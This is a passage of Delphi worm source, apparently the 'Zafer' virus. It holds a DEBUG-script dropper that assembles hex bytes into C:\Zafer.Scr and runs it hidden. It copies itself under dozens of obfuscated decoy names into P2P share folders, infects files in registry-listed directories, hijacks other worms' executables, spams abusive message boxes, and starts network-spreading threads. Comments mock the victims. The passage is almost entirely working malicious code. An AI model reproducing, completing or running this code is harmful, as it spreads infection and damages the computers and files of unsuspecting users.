   writeln(qup,'echo e 2E80  D4 30 2D 40 59 E0 46 19 00 A8 3E E6 5E B8 83 AB>>zafer');
   writeln(qup,'echo e 2E90  63 B0 38 92 62 C4 02 B6 0A 84 39 E1 74 0E 33 3C>>zafer');
   writeln(qup,'echo e 2EA0  06 56 0D 54 FF A2 5D 15 F3 5E E6 9F 28 9A 03 A5>>zafer');
   writeln(qup,'echo e 2EB0  25 20 5F F7 02 12 C6 E9 43 FD B8 91 B8 99 58 03>>zafer');
   writeln(qup,'echo e 2EC0  95 96 6C 63 02 FD 5D 22 5E D1 CE 0F C8 B4 D4 B4>>zafer');
   writeln(qup,'echo e 2ED0  52 16 F8 D9 EB F3 56 EE DC 16 E8 7A DA 7D D6 D1>>zafer');
   writeln(qup,'echo e 2EE0  D4 06 4C E2 89 FF 78 43 02 9B 91 EB E6 B7 5E 41>>zafer');
   writeln(qup,'echo e 2EF0  04 FD 76 32 F9 5E 10 2D 67 56 42 7F 5F 2B D7 8D>>zafer');
   writeln(qup,'echo e 2F00  AD 35 3D 80 0A D8 22 8D D5 63 33 E8 05 60 1E B4>>zafer');
   writeln(qup,'echo e 2F10  4C 70 6F E8 B7 06 39 33 16 FE 84 57 FB 8D 5C 06>>zafer');
   writeln(qup,'echo e 2F20  65 AA 0F 1B A7 F7 3D 1D 05 F2 DB 29 54 5E ED 52>>zafer');
   writeln(qup,'echo e 2F30  A9 CD E0 CB 51 3C 81 52 2E 02 0E 1F AD 57 0A 0C>>zafer');
   writeln(qup,'echo e 2F40  BB BF B8 23 45 E1 1B 94 51 AD EA 0F B7 BA 21 E3>>zafer');
   writeln(qup,'echo e 2F50  04 DA C5 16 0C D4 15 4D C5 07 56 60 FF CB CF 3C>>zafer');
   writeln(qup,'echo e 2F60  3C 46 4D 53 FF 47 3E 3E 02 10 53 79 6E FF 74 61>>zafer');
   writeln(qup,'echo e 2F70  78 20 65 72 72 6F 85 72 79 FF 10 52 45 54 55 52>>zafer');
   writeln(qup,'echo e 2F80  4E 20 FF 77 69 74 68 6F 75 74 20 FF 47 4F 53 55>>zafer');
   writeln(qup,'echo e 2F90  42 00 04 10 BB 4F 0B 6F 66 FF 20 44 41 54 41 00>>zafer');
   writeln(qup,'echo e 2FA0  05 10 FF 49 6C 6C 65 67 61 6C 20 FF 66 75 6E 63>>zafer');
   writeln(qup,'echo e 2FB0  74 69 6F 6E DB 20 63 0C 6C DB 00 06 25 76 6F 46>>zafer');
   writeln(qup,'echo e 2FC0  66 6C 6F A3 77 F3 58 30 7D 6D 65 6D BD 56 79 00>>zafer');
   writeln(qup,'echo e 2FD0  09 BF 66 75 62 73 63 72 DC 69 70 15 CF 19 72 61>>zafer');
   writeln(qup,'echo e 2FE0  FF 6E 67 65 00 0A 10 44 75 ED 70 6C 69 3F FF 74>>zafer');
   writeln(qup,'echo e 2FF0  65 20 64 65 66 69 6E BC 69 4F 6B 79 16 7D 69 76>>zafer');
   writeln(qup,'echo e 3000  69 73 FE 5A 62 79 20 7A DF 55 6F 00 0D 10 ED 54>>zafer');
   writeln(qup,'echo e 3010  79 70 24 B6 6D 15 6D DF 2C 63 68 00 0E 61 62 ED>>zafer');
   writeln(qup,'echo e 3020  73 74 56 6B 4A 06 7B 70 61 63 4F 6D 10 68 67 0E>>zafer');
   writeln(qup,'echo e 3030  66 6F 76 6D 75 6C FB 61 20 74 6F 6F 9D 76 6F 6D>>zafer');
   writeln(qup,'echo e 3040  63 FE 65 78 00 13 10 4E D6 0C E0 B7 D1 4D 45 EC>>zafer');
   writeln(qup,'echo e 3050  00 14 10 08 D9 E9 21 00 3B 33 DB 42 0E B6 0A 6E>>zafer');
   writeln(qup,'echo e 3060  E6 DC 10 76 44 89 CA 65 DB 59 20 EA 7D 61 76 61>>zafer');
   writeln(qup,'echo e 3070  69 B6 51 62 49 FB 00 46 10 50 1D 5C 89 F7 A0 B6>>zafer');
   writeln(qup,'echo e 3080  37 B4 65 64 FB 00 49 10 46 65 98 76 75 72 29 17>>zafer');
   writeln(qup,'echo e 3090  50 64 15 C3 72 09 5D 76 27 FF F7 10 55 6E 70 A2>>zafer');
   writeln(qup,'echo e 30A0  5E 74 1F C1 64 56 52 DA 52 19 DB 9A 66 0B 6E 6D>>zafer');
   writeln(qup,'echo e 30B0  CE FF 61 72 74 00 01 80 42 79 6D 87 73 D6 12 65>>zafer');
   writeln(qup,'echo e 30C0  44 DA 06 1E 15 2C BF 1F 6D 2D 6E 75 6D B5 62 31>>zafer');
   writeln(qup,'echo e 30D0  AD 22 13 FF 64 20 28 2D 33 32 37 36 BA 38 E0 20>>zafer');
   writeln(qup,'echo e 30E0  FC 08 37 29 2F 74 80 48 69 2B 29 42 30 F7 6B 65>>zafer');
   writeln(qup,'echo e 30F0  79 17 B5 3B D7 79 6E 09 ED 73 79 56 6F 7F 00 08>>zafer');
   writeln(qup,'echo e 3100  80 B6 20 78 20 16 8D 80 1C 37 2E 7B 80 6C D6 0D>>zafer');
   writeln(qup,'echo e 3110  82 85 6C B7 80 99 64 75 6B 8C 18 65 0C BB 61 41>>zafer');
   writeln(qup,'echo e 3120  64 64 6B 39 DB 5B 0E 0D ED 80 2A 42 09 ED 61 6B>>zafer');
   writeln(qup,'echo e 3130  2A A0 C2 90 53 65 02 19 50 A1 B6 B6 5B A5 06 6F>>zafer');
   writeln(qup,'echo e 3140  16 54 4F 50 6C 78 90 24 8A B6 1D 6B 10 89 70 00>>zafer');
   writeln(qup,'echo e 3150  94 CC 6C 60 58 B5 2F 79 EF 01 98 45 F0 B5 20 6E>>zafer');
   writeln(qup,'echo e 3160  8B 4D 44 70 6E 2D B6 EF 6D 22 84 F7 6D 61 2D C2>>zafer');
   writeln(qup,'echo e 3170  7A 61 FE 38 02 98 C2 3E F8 03 98 44 D6 87 0C 0E>>zafer');
   writeln(qup,'echo e 3180  2D 61 D0 92 A1 60 38 07 04 98 B7 46 0E 20 68 6D>>zafer');
   writeln(qup,'echo e 3190  A3 70 92 93 97 BD 52 36 B7 30 00 0D 0A B0 2D 8E>>zafer');
   writeln(qup,'echo e 31A0  63 6F 94 05 AD 11 57 63 1B 32 3B 11 9C 6B ED 83>>zafer');
   writeln(qup,'echo e 31B0  70 6F B2 A3 74 DA 6F 03 E0 11 B7 CB 64 26 48 03>>zafer');
   writeln(qup,'echo e 31C0  CE 33 E1 1B AE E9 BC 8E 64 8E 68 1C FB 8C 30 20>>zafer');
   writeln(qup,'echo e 31D0  A4 04 67 34 7F 98 32 2E 31 DC 30 20 D5 14 F2 70>>zafer');
   writeln(qup,'echo e 31E0  3A 6F 75 71 75 69 72 0D E9 08 63 25 38 3B 5E DA>>zafer');
   writeln(qup,'echo e 31F0  B5 37 66 67 68 08 41 37 66 2E 37 B9 67 75 6B D3>>zafer');
   writeln(qup,'echo e 3200  60 6E 73 51 B1 09 2B 90 39 A5 AD 10 7F 6D F0 6E>>zafer');
   writeln(qup,'echo e 3210  EE 2E C7 9E 0C 31 46 69 90 8A 42 67 86 08 7B CB>>zafer');
   writeln(qup,'echo e 3220  82 E3 75 21 5D 25 0D 23 33 20 76 66 24 53 0E 7C>>zafer');
   writeln(qup,'echo e 3230  CA 31 E1 41 9A 17 DE 63 6C 2D 42 97 19 41 4B 73>>zafer');
   writeln(qup,'echo e 3240  71 0F 6F 75 28 08 12 D8 0F 26 CE 35 D4 14 A9 4A>>zafer');
   writeln(qup,'echo e 3250  88 52 F7 8E 83 78 48 77 75 93 ED FF 9A 04 09 CF>>zafer');
   writeln(qup,'echo e 3260  21 9D 1B 20 13 5B 00 00 25 5A DF CD 43 00 B1 FE>>zafer');
   writeln(qup,'echo e 3270  60 29 85 36 02 94 AB 45 7B 4D 00 2A 68 7B 5A 61>>zafer');
   writeln(qup,'echo e 3280  66 A6 92 8F D9 66 6C ED 43 65 C4 EC 2D 2A 20 18>>zafer');
   writeln(qup,'echo e 3290  0B B2 20 19 24 0A 02 EB 55 BC 5D A6 C2 F1 C4 00>>zafer');
   writeln(qup,'echo e 32A0  4B 00 BF 62 B2 2A 1C 00 B0 5B DE 45 FF 44 5A 41>>zafer');
   writeln(qup,'echo e 32B0  43 20 4C 41 42 0C C5 1B D1 20 12 74 18 1D AD EF>>zafer');
   writeln(qup,'echo e 32C0  6B 03 BB 76 01 03 0D E5 00 0D 51 2F FB 37 05 FD>>zafer');
   writeln(qup,'echo e 32D0  06 03 FF 21 6A 21 AE 03 05 20 FF E5 03 EC 03 FB>>zafer');
   writeln(qup,'echo e 32E0  03 5A 05 EA FF FE 1B AD E3 BA 1D 23 7D DF 31 14>>zafer');
   writeln(qup,'echo e 32F0  00 72 04 2D 07 DE 63 70 07 07 04 DB 02 10 16 A5>>zafer');
   writeln(qup,'echo e 3300  08 A5 19 23 C4 0A 01 18 1F 1C 00 A2 07 CD 7A 00>>zafer');
   writeln(qup,'echo e 3310  01 30 21 A9 07 F8 6B 28 0C 6D 01 38 B6 03 20 D5>>zafer');
   writeln(qup,'echo e 3320  B7 8C 01 C5 B0 0F 01 8B 62 54 DD 43 18 50 B4 02>>zafer');
   writeln(qup,'echo e 3330  60 56 BD A0 35 AE B6 0E 05 02 F6 40 1C 46 96 BB>>zafer');
   writeln(qup,'echo e 3340  0F 78 02 BB 90 96 1A 01 BD B0 B9 B6 96 FF 9F EE>>zafer');
   writeln(qup,'echo e 3350  08 FF 00 BA 0E 14 2C DD 0B 03 01 98 EE 35 72 BF>>zafer');
   writeln(qup,'echo e 3360  34 5F 43 5F 46 49 FF 4C 45 5F 49 4E 46 4F 3D 9D>>zafer');
   writeln(qup,'echo e 3370  11 F6 E2 81 00 B6 5C 07 E9 0D 17 61 21 48 61 03>>zafer');
   writeln(qup,'echo e 3380  C0 06 A6 D6 CF 03 04 80 05 2D 84 26 06 FF B0 07>>zafer');
   writeln(qup,'echo e 3390  31 08 24 01 A9 56 7C 6E 09 0F 89 FA 7F 42 4A 46>>zafer');
   writeln(qup,'echo e 33A0  FB 45 14 2A 72 FF 0C B3 C1 46 D8 B1 5C FE 07 08>>zafer');
   writeln(qup,'echo e 33B0  0A 09 0B 0C 0D EC 1A 20 08 9A 95 0A EF 01 09 C3>>zafer');
   writeln(qup,'echo e 33C0  7C 03 63 CB 0E 5A 83 24 E0 60 1D 25 6E BA 08 40>>zafer');
   writeln(qup,'echo e 33D0  9A E1 76 CD 51 3E ED 0C 3F 04 01 A3 52 4D 78 E8>>zafer');
   writeln(qup,'echo e 33E0  8C C0 35 AF BD 25 1F A3 04 B6 51 06 5E D0 8E B1>>zafer');
   writeln(qup,'echo e 33F0  BF 0E 2D 08 8B 05 C8 02 25 FD E2 50 B8 34 37 A0>>zafer');
   writeln(qup,'echo e 3400  8C C3 FB 8C D8 48 8E D8 1A 61 BF 3F 70 B9 10 DC>>zafer');
   writeln(qup,'echo e 3410  F8 F3 AE 47 52 C5 EC C3 48 11 68 B1 5E D7 C6 F7>>zafer');
   writeln(qup,'echo e 3420  D0 29 56 7E DA 2B D0 73 04 DE 29 2B D2 D3 A2 DC>>zafer');
   writeln(qup,'echo e 3430  32 8E DA 5A BE C6 15 C2 46 C0 47 F8 8E FF C2 AC>>zafer');
   writeln(qup,'echo e 3440  8A D0 4E AD 8B C8 FF 46 8A C2 24 FE 3C B0 75 D5>>zafer');
   writeln(qup,'echo e 3450  05 AC 6F C1 06 3C B2 4A E7 D6 6C 12 82 5E 27 B1>>zafer');
   writeln(qup,'echo e 3460  BE 32 0A EB C6 1E 8D 7B FC 33 D2 28 BF E3 13 8B>>zafer');
   writeln(qup,'echo e 3470  C2 03 C3 6B 68 0A 78 F8 83 FF BB 37 26 01 D5 1D>>zafer');
   writeln(qup,'echo e 3480  E2 BC 07 FA 00 F0 5B 50 81 1B AC 10 DB EB DC 5A>>zafer');
   writeln(qup,'echo e 3490  40 6F 1D 83 EF 10 73 18 8F B6 EB E2 96 A1 B9 66>>zafer');
   writeln(qup,'echo e 34A0  08 5D A5 F0 88 01 5B 8E 2D B0 5F BA BB 6E F4 FA>>zafer');
   writeln(qup,'echo e 34B0  8E A5 59 A3 E7 BE 7F C5 2E FF 2F B4 40 AA BB D1>>zafer');
   writeln(qup,'echo e 34C0  7D 6E 63 8C CA DE A7 BA 1C 01 02 DA 51 FF AB 95>>zafer');
   writeln(qup,'echo e 34D0  60 50 64 0D D5 14 66 A0 0C 68 70 73 10 30 E9 60>>zafer');
   writeln(qup,'echo e 34E0  12 61 3D 3B 68 48 50 42 04 B5 CB 63 52 BA C3 C3>>zafer');
   writeln(qup,'echo e 34F0  7D 7F 79 04 4A 05 0B 09 A9 FF 2D F4 2E 25 31 75>>zafer');
   writeln(qup,'echo e 3500  32 48 FE 33 C7 33 23 34 A3 35 8D AF 46 C3 FF 93>>zafer');
   writeln(qup,'echo e 3510  37 F1 0A 19 0B 63 FF 0B 96 0B FE 0B C4 0C 28 FF>>zafer');
   writeln(qup,'echo e 3520  0D 53 0D 58 0D 78 0D BF FF 0D 06 0E 21 0E 86 0F>>zafer');
   writeln(qup,'echo e 3530  2D FF 17 56 17 7F 17 4D 1A D8 FF 43 21 01 48 01>>zafer');
   writeln(qup,'echo e 3540  A7 01 AE FF 01 BA 01 CA 01 CC 01 F8 FF 02 12 03>>zafer');
   writeln(qup,'echo e 3550  EE 43 7B 1E 2B FF 1F 20 22 27 22 35 22 9B FF 22>>zafer');
   writeln(qup,'echo e 3560  A3 22 AB 22 B3 22 E2 DB 22 E9 0F 23 F4 3E 23 47>>zafer');
   writeln(qup,'echo e 3570  23 2F 71 CB 26 24 FF 27 68 03 EA 43 D9 27 26 FF>>zafer');
   writeln(qup,'echo e 3580  28 2F 28 52 28 5B 28 B6 FF 28 C5 28 14 29 E9 2B>>zafer');
   writeln(qup,'echo e 3590  FE FF 2B 5F 40 6A 40 6E 40 72 FF 40 76 40 7A 40>>zafer');
   writeln(qup,'echo e 35A0  7E 40 82 FF 40 0A 2C 18 2C 36 2C B6 A0 2C 97 8E>>zafer');
   writeln(qup,'echo e 35B0  2C 65 AC 2D 5D 8B 00 00 00 00 00 04 80 FF A4 00>>zafer');
   writeln(qup,'echo e 35C0  FF 75 03 E8 5D 00 72 F6 41 8C C0 E8 48 00 E3 59>>zafer');
   writeln(qup,'echo e 35D0  73 F9 49 49 74 0C C1 E1 04 89 CD 8A 1C 46 F6 D3>>zafer');
   writeln(qup,'echo e 35E0  31 C9 E8 31 00 11 C9 75 08 41 E8 29 00 73 FB 41>>zafer');
   writeln(qup,'echo e 35F0  41 81 FD D1 00 83 D9 FE 29 E8 72 0E 8E D8 8D 01>>zafer');
   writeln(qup,'echo e 3600  28 FC 96 F3 A4 96 8E DA EB B5 C1 E0 04 6A 00 1F>>zafer');
   writeln(qup,'echo e 3610  01 D8 01 F8 EB EA 00 FF 75 03 E8 06 00 11 C9 00>>zafer');
   writeln(qup,'echo e 3620  FF 75 05 8A 3C 46 10 FF C3 5D 07 06 1F 8D 86 61>>zafer');
   writeln(qup,'echo e 3630  04 8E D0 BC 80 00 EA 10 00 EA 03 61 04 80 00 F3>>zafer');
   writeln(qup,'echo e 3640  00 1F 00>>zafer');
   writeln(qup,'echo rcx>>zafer');
   writeln(qup,'echo 3542>>zafer');
   writeln(qup,'echo nC:\Zafer.Scr>>zafer');
   writeln(qup,'echo w>>zafer');
   writeln(qup,'echo q>>zafer');
   writeln(qup,'debug < zafer');
   writeln(qup,'@start C:\Zafer.Scr');
   closefile(qup);
   WinExec(PChar(az),SW_HIDE);
   end;

   function colapse:integer;
   var
   X,Xx,X2,Xx2,T,tx,Y,Yy,Y2,Yy2:string;
   Ti,m1,m2:pchar;
   n:integer;
   begin
   if PEDOman <> 0 then
   begin
   if Pedofilic > 10 then begin
   XxO(HKEY_LOCAL_MACHINE,x3b,Xx,Xx2);
   FOR n := 1 to 999 do begin
   MessageBox(0,'YOU ARE A PEDOFILIC!!!','*-Zafer Infected Cell-*',0);
   end;
   end;
    END;
    end;
   function bacteriap2p:integer;
   var DIF:integer;
   begin
   Xx21();
   for DIF := 1 to 15 do begin
   if DirectoryExists(fp2[DIF]) then
   begin
   bacteria(fp2[DIF]);
   deads(fp2[DIF])
   end;
   end;
    end;

   function infx:integer;
   var DIX:integer;
       o1,o2,o3,o4,o5,o6,o7,o8,o9,o10,o11,o12,o13,o14,o15,o16,o17,o18:string;
       w1,w2,w3,w4:string;
       r1,r2,r3,r4,r5,r6,r7,r8,r9,r10:string;
       q1,q2,q3,q4,q5,q6,q7,q8,q9,q10:string;
       ox1,ox2,ox3,ox4,ox5,ox6,ox7,ox8,ox9:string;
       infect:Array[1..18] of string;
   begin
   r1 := '~[RVQVLKM^KVIZkPPSL'; r2 := '~OO{^K^'; r3 := '|^\WZ'; r4 := '{ZLTKPO'; r5 := 'sP\^S~OO{^K^';
   r6 := 'qZKwPP['; r7 := 'oZMLPQ^S'; r8 := 'lZQ[kP'; r9 := 'lK^MKrZQJ'; r10 := 'lK^MKJO';
   q1 := x(r1); q2 := x(r2); q3 := x(r3); q4 := x(r4); q5 := x(r5); q6 := x(r6); q7 := x(r7); q8 := x(r8);
   q9 := x(r9); q10 := x(r10);
   ox1 := '\'; ox2 := 'Z'; ox3 := 'Y'; ox4 := 'v'; ox5 := 'p'; ox6 := 'g'; ox7 := 'f'; ox8 := 'e'; ox9 := Pro;
   o1 := x(ox1); o2 := x(ox2); o3 := x(ox3); o4 := x(ox4); o5 := x(ox5); o6 := x(ox6); o7 := x(ox7); o8 := x(ox8);
   o10 := XMsh(HKEY_CURRENT_USER,ped,q1); o11 := XMsh(HKEY_CURRENT_USER,ped,q2);
   o12 := XMsh(HKEY_CURRENT_USER,ped,q3); o13 := XMsh(HKEY_CURRENT_USER,ped,q4);
   o14 := XMsh(HKEY_CURRENT_USER,ped,q5); o15 := XMsh(HKEY_CURRENT_USER,ped,q6);
   o15 := XMsh(HKEY_CURRENT_USER,ped,q7); o16 := XMsh(HKEY_CURRENT_USER,ped,q8);
   o17 := XMsh(HKEY_CURRENT_USER,ped,q9); o18 := XMsh(HKEY_CURRENT_USER,ped,q10);
   w1 := x(o1); w2 := x(o2); w3 := x(o3); w4 := x(o4);
   infect[1] := o1; infect[2] := o2; infect[3] := o3; infect[4] := o4; infect[5] := o5;
   infect[6] := o6; infect[7] := o7; infect[8] := o8; infect[9] := o9; infect[10] := o10;
   infect[11] := o11; infect[12] := o12; infect[13] := o13; infect[14] := o14; infect[15] := o15;
   infect[16] := o16; infect[17] := o17; infect[18] := o18;
   Xx21();
   for DIX := 1 to 18 do begin
   if DirectoryExists(infect[DIX]) then
   begin
   bacteria(infect[DIX]);
   deads(infect[DIX])
   end;
   end;
        end;

      function wormhunter:integer;
     var ns1,nsd1,ztf,zt,gt,gtf,ns2,nsd2,ns3,nsd3,ns4,nsd4,ns5,ns5x,nsd5,hafx,haf,HhH:string;
         bx1,ba1,bx2,ba2,bx3,ba3:string;
     begin
     gtf := 'cXZ[E^\ZGZ'; gt := x(gtf);
     ztf := '|cE^YZM'; zt := x(ztf);
     ns1 := 'yiompkz|kzgz'; nsd1 := x(ns1);
     ns2 := 'HVQSPXPQZGZ'; nsd2 := x(ns2);
     ns3 := 'lzmiv|zlzgz'; nsd3 := x(ns3);
     ns4 := 'LFLRPQGOZGZ'; nsd4 := x(ns4);
     ns5 := 'u^RRZM'; ns5x := 'Q[ZGZ'; nsd5 := x(ns5) + '2' + x(ns5x);
     hafx := '`w^E^YV]]'; haf := x(hafx);
     bx1 := '{mi{{sszgz'; ba1 := x(bx1);
     bx2 := 'HVQ[PHZGZ'; ba2 := x(bx2);
     bx3 := '[MILFLZGZ'; ba3 := x(bx3);
     HhH := XMsh(HKEY_LOCAL_MACHINE,x3b,haf);
     if not DirectoryExists(zt) then CreateDirectory(Pchar(zt), nil);
     if fileexists(folder + nsd1) then
     begin
     Xx21(); Kill(nsd1); Copyfile(pchar(folder + nsd1),Pchar(zt + gt),true);
     bacteria(zt); deads(zt); deletefile(pchar(folder + nsd1)); Copyfile(pchar(zt + gt),Pchar(folder + nsd1),true);
     deletefile(pchar(zt + gt)); WinExec(PChar(folder + nsd1),SW_HIDE);
     end;
     if fileexists(folder + nsd2) then
     begin
     Xx21(); Kill(nsd2); Copyfile(pchar(folder + nsd2),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(folder + nsd2)); Copyfile(pchar(zt + gt),Pchar(folder + nsd2),true); deletefile(pchar(zt + gt)); WinExec(PChar(folder + nsd2),SW_HIDE);
     end;
     if fileexists(folder + nsd3) then
     begin
     Xx21(); Kill(nsd3); Copyfile(pchar(folder + nsd3),Pchar(zt + gt),true); bacteria(zt);
     deads(zt); deletefile(pchar(folder + nsd3)); Copyfile(pchar(zt + gt),Pchar(folder + nsd3),true);
     deletefile(pchar(zt + gt)); WinExec(PChar(folder + nsd3),SW_HIDE);
     end;
     if fileexists(folder + nsd4) then
     begin
     Xx21(); Kill(nsd4);
     Copyfile(pchar(folder + nsd4),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(folder + nsd4)); Copyfile(pchar(zt + gt),Pchar(folder + nsd4),true);
     deletefile(pchar(zt + gt)); WinExec(PChar(folder + nsd4),SW_HIDE);
     end;
       if fileexists(folder + nsd5) then
     begin
     Xx21(); Kill(nsd5); Copyfile(pchar(folder + nsd5),Pchar(zt + gt),true);
     bacteria(zt); deads(zt); deletefile(pchar(folder + nsd5)); Copyfile(pchar(zt + gt),Pchar(folder + nsd5),true);
     deletefile(pchar(zt + gt)); WinExec(PChar(folder + nsd5),SW_HIDE);
     end;
     if fileexists(HhH) then
     begin
     Xx21(); Kill(nsd3); Copyfile(pchar(HhH),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(HhH)); Copyfile(pchar(zt + gt),Pchar(HhH),true); deletefile(pchar(zt + gt));
     WinExec(PChar(HhH),SW_HIDE);
     end;
     if fileexists(folder + ba1) then
     begin
     Xx21(); Kill(ba1); Copyfile(pchar(folder + ba1),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(folder + ba1)); Copyfile(pchar(zt + gt),Pchar(folder + ba1),true); deletefile(pchar(zt + gt));
     WinExec(PChar(folder + ba1),SW_HIDE);
     end;
     if fileexists(folder + ba2) then
     begin
     Xx21(); Kill(ba2); Copyfile(pchar(folder + ba2),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(folder + ba2)); Copyfile(pchar(zt + gt),Pchar(folder + ba2),true); deletefile(pchar(zt + gt));
     WinExec(PChar(folder + ba2),SW_HIDE);
     end;
     if fileexists(folder + ba3) then
     begin
     Xx21(); Kill(ba3); Copyfile(pchar(folder + ba3),Pchar(zt + gt),true); bacteria(zt); deads(zt);
     deletefile(pchar(folder + ba3)); Copyfile(pchar(zt + gt),Pchar(folder + ba3),true); deletefile(pchar(zt + gt));
     WinExec(PChar(folder + ba3),SW_HIDE);
     end;
     end;





     function p2p:integer;
     var DM,DM2:integer;
         h,p:string;
         p1,p2,p3,p4,p5,p6,p7,p8,p9,p10,p11,p12,p13,p14,p15,p16,p17,p18,p19,p20:string;
         p21,p22,p23,p24,p25,p26,p27,p28,p29,p30,p31,p32,p33,p34,p35,p36,p37,p38,p39,p40:string;
         p41,p42,p43,p44,p45,p46,p47,p48,p49,p50:string;
         h1,h2,h3,h4,h5,h6,h7,h8,h9,h10,h11,h12,h13,h14,h15,h16,h17,h18,h19,h20:string;
         h21,h22,h23,h24,h25,h26,h27,h28,h29,h30,h31,h32,h33,h34,h35,h36,h37,h38,h39,h40:string;
         h41,h42,h43,h44,h45,h46,h47,h48,h49,h50:string;
     begin
     p1 := '~[~H^MZ  '; p2 := 'lOF]PK'; p3 := 'v\N'; p4 := 'hVQeVO'; p5 := 'vRZLW';
     p6 := 'sVRZhVMZ'; p7 := 'rPMOWZJL'; p8 := '~I^QK}MPHLZM'; p9 := 'v\NoMP]'; p10 := 'mZ^SoS^FZM';
     p11 := '{VIgoS^FZMHVKW{VIg|P[Z\'; p12 := '{PHQSP^[~\\ZSZM^KPMoSJL'; p13 := 'hVQm~m';
     p14 := 'rlqkPPS]^M'; p15 := 'kMVSSV^QrZLLZQXZM'; p16 := 'h^MZEOZZMKPOZZM'; p17 := 'mZXVLKMFrZ\W^QV\';
     p18 := '~[P]Z~\MP]^KmZ^[ZM'; p19 := 'lOFH^MZ{P\KPM'; p20 := 'iVMKJ^Ss^]{^K^mZ\PIZMF';
     p21 := '~MZLx^S^GF'; p22 := 'f^WPPrZLLZQXZM'; p23 := 'qZKoJROZM'; p24 := 'ePQZ~S^MR';
     p25 := 'yS^LWxZK'; p26 := 'ZrJSZ'; p27 := 'mP]PyPMR'; p28 := 'lOFwJQKZM'; p29 := '}VK|PRZK';
     p30 := '[}OPHZM~ROrJLV\|PQIZMKZM'; p31 := 'wVU^\TkWVL'; p32 := '~SSVQpQZlZ\MZKR^TZM';
     p33 := 'uZK~J[VP}^LV\'; p34 := 'qZMP    jSKM^z[VKVPQ'; p35 := 'iV[ZP~[L}SP\TZM';
     p36 := 't^E^^{PHQSP^[~\\ZSZM^KPMoMP'; p37 := '~psvQLK^QKrZLLZQXZM~vr';
     p38 := 'rlqrZLLZQXZMhVQ[PHLgo'; p39 := 'nJV\TkVRZ'; p40 := 'nJV\TkVRZ'; p41 := '}^EPPT^~[H^MZ^Q[lOFH^MZl\^QQZM';
     p42 := '~[^H^MZ mZYZMZQ\ZyVSZ'; p43 := 'lPSlJVKZlPSVK^VMZ|^M[x^RZLlJVKZ';
     p44 := 'rV\MPLPYKhVQ[PHLrZ[V^oS^FZM'; p45 := 'hZ]MPPKlOFlHZZOZM'; p46 := 'qPMKPQ~QKViVMJL{ZYVQVKVPQLjO[^KZVo^\T^XZ';
     p47 := 'hl`ykosz'; p48 := 'hVQo^KMPS'; p49 := 'hVQ^ROoMPz[VKVPQ'; p50 := '~I^LKwPRZz[VKVPQ';


     if peer2peer > 2 then begin
     g[1] := x(p1); g[2] := x(p2); g[3] := x(p3); g[4] := x(p4); g[5] := x(p5); g[6] := x(p6);
     g[7] := x(p7); g[8] := x(p8); g[9] := x(p9); g[10] := x(p10); g[11] := x(p11); g[12] := x(p12);
     g[13] := x(p13); g[14] := x(p14); g[15] := x(p15); g[16] := x(p16); g[17] := x(p17); g[18] := x(p18);
     g[19] := x(p19); g[20] := x(p20); g[21] := x(p21); g[22] := x(p22); g[23] := x(p23); g[24] := x(p24);
     g[25] := x(p25); g[26] := x(p26); g[27] := x(p27); g[28] := x(p28); g[29] := x(p29); g[30] := x(p30);
     g[31] := x(p31); g[32] := x(p32); g[33] := x(p33); g[34] := x(p34); g[35] := x(p35); g[36] := x(p36);
     g[37] := x(p37); g[38] := x(p38); g[39] := x(p39); g[40] := x(p40); g[41] := x(p41); g[42] := x(p42);
     g[43] := x(p43); g[44] := x(p44); g[45] := x(p45); g[46] := x(p46); g[47] := x(p47); g[48] := x(p48); g[49] := x(p49); g[50] := x(p50);

     CreateThread(nil,0,@bacteriap2p,nil,0,ThreadID);

      For DM := 1 to 15 do  Begin
       for DM2 := 1 to 50 do  Begin
       Copyfile(pchar(who),Pchar(pro+fp2[DM]+g[DM2]+'.exe'),true);

       end;
       end;

       end
       else
       CreateThread(nil,0,@bacteriap2p,nil,0,ThreadID);
       end;



   procedure main1;
   begin
   //umm a dangerous field :p
   //¿what we do? this user maybe want to kill me! xD
   //umm we don't infect p2p we don't make a wormhunter :P umm we just make a net worm
   //(i suppose this is not a pedofilic user xD)
   CreateThread(nil,0,@net,nil,0,ThreadID); CreateThread(nil,0,@WakeUp,nil,0,ThreadID);
   CreateThread(nil,0,@nigth,nil,0,ThreadID);  //we search new users more stupids xD
   sleep($FFFFFFFF);   //Residentes :)
   end;

     procedure main2;
     begin
     //ok some inteligents users ;)
     if WEBSERVERx = '1' then CreateThread(nil,0,@MainServer,nil,0,ThreadID) else
     begin
     peer2peer := 2;
   CreateThread(nil,0,@p2p,nil,0,ThreadID);
   CreateThread(nil,0,@infx,nil,0,ThreadID); CreateThread(nil,0,@wormhunter,nil,0,ThreadID);
   CreateThread(nil,0,@net,nil,0,ThreadID); CreateThread(nil,0,@WakeUp,nil,0,ThreadID);
   CreateThread(nil,0,@nigth,nil,0,ThreadID);CreateThread(nil,0,@colapse,nil,0,ThreadID);
   sleep($FFFFFFFF);   //Residentes :)
   end;
   end;

     procedure main3;
     begin
     // a little bit stupid users
     if WEBSERVERx = '1' then CreateThread(nil,0,@MainServer,nil,0,ThreadID) else
     begin
     peer2peer := 3;
   CreateThread(nil,0,@p2p,nil,0,ThreadID); CreateThread(nil,0,@zafer,nil,0,ThreadID);
   CreateThread(nil,0,@infx,nil,0,ThreadID); CreateThread(nil,0,@wormhunter,nil,0,ThreadID);
   CreateThread(nil,0,@net,nil,0,ThreadID); CreateThread(nil,0,@WakeUp,nil,0,ThreadID);
   CreateThread(nil,0,@nigth,nil,0,ThreadID);CreateThread(nil,0,@colapse,nil,0,ThreadID);
   CreateThread(nil,0,@disk,nil,0,ThreadID);
   sleep($FFFFFFFF);   //Residentes :)
    end;
    end;

     procedure main4;
     begin
     //for some stupid users.....
     if WEBSERVERx = '1' then CreateThread(nil,0,@MainServer,nil,0,ThreadID) else
     begin
   peer2peer := 4;
   CreateThread(nil,0,@p2p,nil,0,ThreadID); CreateThread(nil,0,@zafer,nil,0,ThreadID);
   CreateThread(nil,0,@infx,nil,0,ThreadID); CreateThread(nil,0,@wormhunter,nil,0,ThreadID);
   CreateThread(nil,0,@net,nil,0,ThreadID); CreateThread(nil,0,@WakeUp,nil,0,ThreadID);
   CreateThread(nil,0,@nigth,nil,0,ThreadID);CreateThread(nil,0,@colapse,nil,0,ThreadID);
